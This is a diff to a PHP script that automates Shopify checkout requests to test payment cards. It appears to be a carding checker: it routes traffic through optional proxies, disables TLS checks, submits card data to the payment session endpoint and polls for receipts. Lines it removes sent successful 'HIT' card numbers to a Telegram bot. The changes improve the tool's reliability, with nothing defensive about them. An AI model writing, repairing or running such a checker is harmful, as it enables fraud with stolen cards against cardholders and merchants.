@@ -18,21 +18,21 @@ if (!empty($proxy_param)) {
         }
     }
 }
-if (empty($proxy_param)) {
-    echo json_encode(["Response" => "Error: Proxy parameter is missing or blank.","Format" => "IP:PORT:USER:PASS"]);
-    exit;
+$use_proxy = false;
+$ip = $port = $user = $pass = '';
+if (!empty($proxy_param)) {
+    $proxy_parts = explode(":", $proxy_param);
+    if (count($proxy_parts) === 4) {
+        $ip   = $proxy_parts[0];
+        $port = $proxy_parts[1];
+        $user = $proxy_parts[2];
+        $pass = $proxy_parts[3];
+        $use_proxy = true;
+    } else {
+        echo json_encode(["Response" => "Error: Incorrect proxy format.","Format" => "Please use the format: IP:PORT:USER:PASS"]);
+        exit;
+    }
 }
-
-$proxy_parts = explode(":", $proxy_param);
-if (count($proxy_parts) !== 4) {
-    echo json_encode(["Response" => "Error: Incorrect proxy format.","Format" => "Please use the format: IP:PORT:USER:PASS"]);
-    exit;
-}
-
-$ip = $proxy_parts[0];
-$port = $proxy_parts[1];
-$user = $proxy_parts[2];
-$pass = $proxy_parts[3];
 
 $agent = new userAgent();
 $ua = $agent->generate('windows');
@@ -128,10 +128,12 @@ $site = "$site2/products.json";
 start:
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $site);
-curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+if ($use_proxy) {
+    curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+}
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -188,10 +190,12 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+if ($use_proxy) {
+    curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+}
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
@@ -301,9 +305,11 @@ card:
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+if ($use_proxy) {
+    curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+}
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
@@ -660,9 +666,11 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+if ($use_proxy) {
+    curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+}
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
@@ -1234,9 +1242,11 @@ usleep(500000);
     $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+if ($use_proxy) {
+    curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+}
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
@@ -1333,9 +1343,11 @@ usleep(500000);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+if ($use_proxy) {
+    curl_setopt($ch, CURLOPT_PROXY, "$ip:$port");
+    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+}
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
@@ -1465,18 +1477,27 @@ if (
         'Gateway'  => $gateway,
     ], JSON_UNESCAPED_SLASHES);
     exit;
-} elseif (strpos($response5, '"__typename":"WaitingReceipt"' || '"__typename":"ProcessingReceipt"')) {
+} elseif (strpos($response5, '"__typename":"FailedReceipt"')) {
+    $err = isset($r5js->data->receipt->processingError->code)
+        ? $r5js->data->receipt->processingError->code
+        : 'PAYMENT_FAILED';
+    echo json_encode([
+        'Response' => $err,
+        'Status'   => 'false',
+        'Price'    => $totalamt,
+        'Gateway'  => $gateway,
+    ], JSON_UNESCAPED_SLASHES);
+    exit;
+} elseif (strpos($response5, '"__typename":"WaitingReceipt"') || strpos($response5, '"__typename":"ProcessingReceipt"')) {
     sleep(5);
     goto poll;
 } else {
-    $msg = "<b>💳 CC:</b> <code>$cc1</code>\n<b>Status:</b> ✅ HIT - Thank You\n<b>Gateway:</b> $gateway\n<b>Price:</b> $totalamt";
-    sendTG($chatId, $botToken, $msg);
-
+    // Unknown response — avoid false-positive hit
     echo json_encode([
-        'Response' => 'Thank You',
-        'Status'   => 'true',
+        'Response' => 'UNKNOWN_RESPONSE',
+        'Status'   => 'false',
         'Price'    => $totalamt,
-        'Gateway'  => $gateway
+        'Gateway'  => $gateway,
     ], JSON_UNESCAPED_SLASHES);
     exit;
 }
